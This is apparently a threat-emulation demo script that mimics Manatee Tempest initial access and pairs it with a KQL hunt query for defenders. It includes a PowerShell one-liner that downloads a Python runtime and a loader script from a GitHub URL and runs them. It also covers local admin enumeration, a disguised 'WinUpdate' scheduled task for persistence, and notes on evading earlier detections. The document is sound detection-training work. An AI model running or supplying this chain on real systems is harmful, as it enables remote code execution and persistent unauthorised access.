# Manatee Tempest Simulation V2: Demo Script

## 1. The Narrative (Introduction)

**The Actor:** Manatee Tempest (SocGholish / Raspberry Robin).

**The Scenario:** A user has been tricked into executing a small command. We are now observing a refined "Stage 1" transition where the attacker stages a payload, enumerates the local environment, and establishes a self-sustaining foothold — all while avoiding the detection signatures that burned V1.

**Key Difference from V1:** The scheduled task no longer executes `rundll32.exe` against the DLL. Instead, the script persists *itself* and the DLL is staged on disk for a hypothetical Stage 2 operator handoff.

---

## 2. Execution Steps & Talking Points

### Step A: The Ingress (Living off the Land)

**Action:** Run the PowerShell command (Stage 0).

```powershell
powershell.exe -Command "curl.exe -L https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip -o C:\ProgramData\python.zip; curl.exe -L https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/refs/heads/main/V2/stage1.py -o C:\ProgramData\hklib.py; Expand-Archive -LiteralPath C:\ProgramData\python.zip -DestinationPath C:\ProgramData\py3 -Force; del C:\ProgramData\python.zip; & C:\ProgramData\py3\python.exe C:\ProgramData\hklib.py"
```

**Narrative:** "We start with a single line of PowerShell. We use curl.exe to pull a legitimate Python environment and our loader from GitHub. This bypasses many basic file-reputation filters because the traffic goes to a trusted domain."

**Hunter Note:** Watch for `powershell.exe` or `cmd.exe` spawning `curl.exe` followed by a large file download to `C:\ProgramData`.

---

### Step B: Payload Staging (DLL Download — No Execution)

**Action:** Python script downloads the DLL to disk.

**Narrative:** "Our loader fetches the payload: `TEST_Dll1.dll`. Unlike V1, the DLL is never executed. It is staged on disk for a hypothetical Stage 2 handoff — the attacker parks the weapon system for a future operator. If the DLL already exists from a previous run, this phase is skipped entirely."

**Visual Check:** Show the DLL appearing in `C:\ProgramData\`.

**Idempotency:** On re-runs, the log shows `[SKIP] DLL already staged`.

---

### Step C: Environment Discovery (Local Admin Enumeration)

**Action:** The script runs `net localgroup Administrators`.

**Narrative:** "Before establishing persistence, the script enumerates the local Administrators group. This is a classic discovery technique (MITRE T1069.001). The attacker needs to know who has elevated access on this machine. This runs on every execution — not just the first — because group membership can change."

**Technical Check:** Review `C:\ProgramData\stage1.log` for the enumerated admin list.

---

### Step D: Self-Persistence (Scheduled Task for the Script)

**Action:** Task creation for `hklib.py` itself (not the DLL).

**Narrative:** "To ensure we don't lose access, we create a Scheduled Task named `WinUpdate`. Critically, this task re-runs our Python loader — not `rundll32.exe`. This removes the high-fidelity detection signature that burned V1. The task fires every 5 minutes. If the task already exists from a previous run, creation is skipped."

**Technical Check:** Run `schtasks /query /tn "WinUpdate" /v`.

**Idempotency:** On re-runs, the log shows `[SKIP] Task 'WinUpdate' already exists`.

---

### Step E: Validation (The Log)

**Action:** Review the log file.

**Narrative:** "Let's check our operational log. On first run, we see three `[OK]` entries. On subsequent runs from the scheduled task, we see `[SKIP]` for the DLL and task, but a fresh admin enumeration — proving the persistence heartbeat is alive."

**First Run Log:**
```
[OK] DLL staged to C:\ProgramData\TEST_Dll1.dll
=== Local Admin Group ===
...
=========================
[OK] Self-persistence established. Task 'WinUpdate' created.
```

**Re-run Log:**
```
[SKIP] DLL already staged at C:\ProgramData\TEST_Dll1.dll
=== Local Admin Group ===
...
=========================
[SKIP] Task 'WinUpdate' already exists.
```

---

## 3. KQL Threat Hunt Query

```kql
// ══════════════════════════════════════════════════════════════════
// Threat Hunt: Suspicious Execution Chain Detection
// Approach: Behavioral detection — no prior knowledge of payloads
// ══════════════════════════════════════════════════════════════════
let Python_NonStandard = 
    DeviceProcessEvents
    | where FileName =~ "python.exe" or FileName =~ "python3.exe"
    | where not(FolderPath has_any (
        "Program Files", 
        "Program Files (x86)", 
        "AppData\\Local\\Programs\\Python",
        "AppData\\Local\\Microsoft\\WindowsApps",
        "Users\\",
        "Windows\\py.exe"
    ))
    | extend Tactic_Detected = "Python Non-Standard Location"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected, 
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Enumeration =
    DeviceProcessEvents
    | where FileName == "net.exe" or FileName == "net1.exe"
    | where ProcessCommandLine has "localgroup" 
        and ProcessCommandLine has "Administrators"
    | extend Tactic_Detected = "Enumeration"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
let Persistence =
    DeviceProcessEvents
    | where FileName == "schtasks.exe"
    | where ProcessCommandLine has "/create" or ProcessCommandLine has "-create"
    | extend Tactic_Detected = "Persistence"
    | project Timestamp, DeviceName, AccountName, Tactic_Detected,
              FolderPath, ProcessCommandLine, 
              InitiatingProcessFileName, InitiatingProcessParentFileName;
// ── Combine and summarize ──
union Python_NonStandard, Enumeration, Persistence
| summarize 
    Tactics = make_set(Tactic_Detected),
    Tactic_Count = dcount(Tactic_Detected),
    Parent_Processes = make_set(InitiatingProcessFileName),
    GrandParent_Processes = make_set(InitiatingProcessParentFileName),
    Commands = make_set(ProcessCommandLine),
    Paths = make_set(FolderPath),
    First_Seen = min(Timestamp),
    Last_Seen = max(Timestamp),
    Event_Count = count()
    by DeviceName, AccountName
| extend Risk = case(Tactic_Count == 3, "HIGH", Tactic_Count == 2, "MEDIUM", "LOW")
| sort by Tactic_Count desc
```

---

## 4. Summary for Security Analysts

**Detection Strategy:** Hunt for the combination of discovery commands (`net.exe` from `python.exe`) and persistence creation (`schtasks.exe` from `python.exe`). On re-runs, the scheduled task heartbeat produces a recurring `python.exe` process spawned by `taskhostw.exe` — this orphaned lineage is a high-confidence persistence indicator.

**V1 vs V2 Comparison:**
| Signal | V1 (Burned) | V2 (Improved) |
|--------|-------------|---------------|
| Task target | `rundll32.exe ... .dll` | `python.exe ... .py` |
| DLL execution | Every minute | Never |
| Idempotency | None (re-creates every run) | Checks before acting |
| Discovery | None | `net localgroup Administrators` |

**Impact:** This access is what Manatee Tempest sells to ransomware operators to facilitate the final encryption stage.
